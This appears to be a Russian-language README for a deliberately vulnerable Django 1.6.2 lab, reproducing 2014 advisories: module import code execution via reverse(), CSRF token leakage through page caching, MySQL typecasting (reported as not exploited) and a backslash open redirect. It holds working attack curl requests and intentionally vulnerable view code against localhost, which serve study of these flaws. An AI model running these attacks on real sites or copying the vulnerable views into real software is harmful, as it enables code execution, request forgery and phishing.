## Source URL

https://www.djangoproject.com/weblog/2014/apr/21/security/

```
$ pip install Django==1.6.2 MySQL-python==1.2.5
$ django-admin.py startproject django-vulnerable
```

## Issue: Unexpected code execution using reverse() ##


Обычный HTTP запрос


	$ curl localhost:8000

	       /\     /\
	      {  `---'  }
	      {  O   O  }  
	    ~~|~   V   ~|~~  
	       \  \|/  /   
	        `-----'__
	        /     \  `^\_
	       {       }\ |\_\_   W
	       |  \_/  |/ /  \_\_( )
	        \__/  /(_E     \__/
	          (  /
	           MM


Для успешной выполнения уязвимости злоумышленник должен использовать внедрить код.

Один из способов - уязвимая конфигурация `MEDIA_ROOT`.

```python
PROJECT_DIR = os.path.dirname(os.path.dirname(__file__))
MEDIA_ROOT = os.path.join(PROJECT_DIR, 'media')
```

Используя загрузку файла залили exploit в `MEDIA_ROOT`.

![upload expliot](https://raw.githubusercontent.com/toidi/django-vulnerable/master/contrib/upload_exploit.png "Upload exploit")


Теперь `MEDIA_ROOT` полноценный `Python package`, который можно импортировать.


       $ tree media/
       media/
       ├── __init__.py
       ├── __init__.pyc
       ├── pwn.py
       └── pwn.pyc


(`pyc` файлы появляются после эксплуатации уязвимости)


HTTP запрос злоумышленника


	$ curl localhost:8000?next=media.pwn.own

	                     .ed"""" """$$$$be.
	                   -"           ^""**$$$e.
	                 ."                   '$$$c
	                /                      "4$$b
	               d  3                      $$$$
	               $  *                   .$$$$$$
	              .$  ^c           $$$$$e$$$$$$$$.
	              d$L  4.         4$$$$$$$$$$$$$$b
	              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
	  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
	 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
	4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
	^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
	  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
	        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
	          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
	             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
	               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
	                  "$   "%*ebJLzb$e$$$$$b $P"
	                    %..      4$$$$$$$$$$ "
	                     $$$e   z$$$$$$$$$$%
	                      "*$c  "$$$$$$$P"
	                       ."""*$$$$$$$$bc
	                    .-"    .$***$$$"""*e.
	                 .-"    .e$"     "*$c  ^*b.
	          .=*""""    .e$*"          "*bc  "*$e..
	        .$"        .z*"               ^*$e.   "*****e.
	        $$ee$c   .d"                     "*$.        3.
	        ^*$E")$..$"                         *   .ee==d%
	           $.d$$$*                           *  J$$$e*
	            """""                              "$$$"


В этом случае происходим импорт модуля `media.pwn` с выполнением `import side effect`

Роковой участок кода

```python
def CVE_2014_0472(request):
    if 'next' in request.GET:
        return redirect(request.GET['next'])
```


## Issue: Caching of anonymous pages could reveal CSRF token ##

### Анатомия уязвимости

	$ curl -I localhost:8000/boom/
	HTTP/1.0 200 OK
	Date: Sun, 04 May 2014 14:58:59 GMT
	Server: WSGIServer/0.1 Python/2.7.6
	Expires: Sun, 04 May 2014 15:07:25 GMT
	Vary: Cookie
	Last-Modified: Sun, 04 May 2014 14:57:25 GMT
	Cache-Control: max-age=600
	X-Frame-Options: SAMEORIGIN
	Content-Type: text/html; charset=utf-8
	Set-Cookie:  csrftoken=EbLMgjQ9g62hzmeaEovXkhhqwIQmKst1; expires=Sun, 03-May-2015 14:57:24 GMT; Max-Age=31449600; Path=/

### Пример

0. Пример кода с view

  ```python
  @csrf_protect
  @cache_page(60 * 10)
  def CVE_2014_0473(request):
      if request.POST:
          return HttpResponse('BOOM!')
      return HttpResponse(unicode(csrf(request)['csrf_token']))
  ```

1. Представим ситуацию. Жертва - постоянный анонимный пользователь сайта.

  ```
  $ curl localhost:8000/boom/
  7Z7YC0t8KhN0wU0wN97I5LN6zrhLFFNc
  ```

2. У злоумышленника есть сайт и механизм(бот), который ходит на сайт жертвы и получает куки анонимов из кэша

3. (прил) пользователь заходит на сайт злоумышленника и там выполняется AJAX запрос аналогичный

  ```
  $ curl --request POST \
	--cookie "csrftoken=7Z7YC0t8KhN0wU0wN97I5LN6zrhLFFNc" \
	--data "csrfmiddlewaretoken=7Z7YC0t8KhN0wU0wN97I5LN6zrhLFFNc" \
	localhost:8000/boom/
  BOOM!
  ```

## Issue: MySQL typecasting

Попытаемся разобраться о чем идет речь


	>>> query_obj = CVE_2014_0474_Blacklist.objects.filter(ip=192.168)
	>>> print query_obj.query
	SELECT `blacklist`.`id`, `blacklist`.`ip` FROM `blacklist` WHERE `blacklist`.`ip` = 192.168

	mysql> SELECT `blacklist`.`id`, `blacklist`.`ip` FROM `blacklist` WHERE `blacklist`.`ip` = 192.168;
	+----+---------------+
	| id | ip            |
	+----+---------------+
	|  2 | 192.168.0.1   |
	|  3 | 192.168.83.17 |
	+----+---------------+
	2 rows in set, 3 warnings (0,01 sec)


Варианты использования:

У злоумышленника появился доступ к очереди(например RabbitMQ) celery.

Celery сериализует аргументы функций. Можно сериализовать число туда, где приложение ожидает строку.

Потенциальная атака: попытаемся удалить всю подсетку из фаервола:


	>>> query_obj.delete()
	Traceback (most recent call last):
	  File "<console>", line 1, in <module>
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/models/query.py", line 465, in delete
	    collector.delete()
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/models/deletion.py", line 260, in delete
	    qs._raw_delete(using=self.using)
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/models/query.py", line 476, in _raw_delete
	    sql.DeleteQuery(self.model).delete_qs(self, using)
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/models/sql/subqueries.py", line 85, in delete_qs
	    self.get_compiler(using).execute_sql(None)
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/models/sql/compiler.py", line 782, in execute_sql
	    cursor.execute(sql, params)
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/backends/util.py", line 69, in execute
	    return super(CursorDebugWrapper, self).execute(sql, params)
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/backends/util.py", line 53, in execute
	    return self.cursor.execute(sql, params)
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/django/db/backends/mysql/base.py", line 124, in execute
	    return self.cursor.execute(query, args)
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/MySQLdb/cursors.py", line 207, in execute
	    if not self._defer_warnings: self._warning_check()
	  File "/Users/e.iskandarov/.virtualenvs/security/lib/python2.7/site-packages/MySQLdb/cursors.py", line 117, in _warning_check
	    warn(w[-1], self.Warning, 3)
	Warning: Truncated incorrect DOUBLE value: '127.0.0.1                                    '


От успешной эксплуатации уязвимости спасает то, что MySQL выдает предупреждения, а Django воспринимает их как ошибки и предотвращает выполнение запроса.


	mysql> SHOW WARNINGS;
	+---------+------+-----------------------------------------------------------------------------------+
	| Level   | Code | Message                                                                           |
	+---------+------+-----------------------------------------------------------------------------------+
	| Warning | 1292 | Truncated incorrect DOUBLE value: '127.0.0.1                                    ' |
	| Warning | 1292 | Truncated incorrect DOUBLE value: '192.168.0.1                                  ' |
	| Warning | 1292 | Truncated incorrect DOUBLE value: '192.168.83.17                                ' |
	+---------+------+-----------------------------------------------------------------------------------+
	3 rows in set (0,00 sec)


На этом я решил остановиться. Эксплуатировать уязвимость не получилось.

Заинтересованным можно попробовать продолжить разные комбинации MySQL и Python коннектора для успешной выполнения атаки.

## Issue: Malformed URLs from user input incorrectly validated (CVE-2014-3730)


Безопасный запрос
```
$ curl -I "localhost:8000/i18n/setlang/?next=https://i-eat-your-skin.com/"
HTTP/1.0 302 FOUND
Date: Sun, 15 Jun 2014 19:22:00 GMT
Server: WSGIServer/0.1 Python/2.7.6
X-Frame-Options: SAMEORIGIN
Content-Type: text/html; charset=utf-8
Location: http://localhost:8000/
```

Опасный запрос
```
$ curl -I "localhost:8000/i18n/setlang/?next=https:\\i-eat-your-skin.com/"
HTTP/1.0 302 FOUND
Date: Sun, 15 Jun 2014 19:22:05 GMT
Server: WSGIServer/0.1 Python/2.7.6
X-Frame-Options: SAMEORIGIN
Content-Type: text/html; charset=utf-8
Location: https:%5Ci-eat-your-skin.com/
```
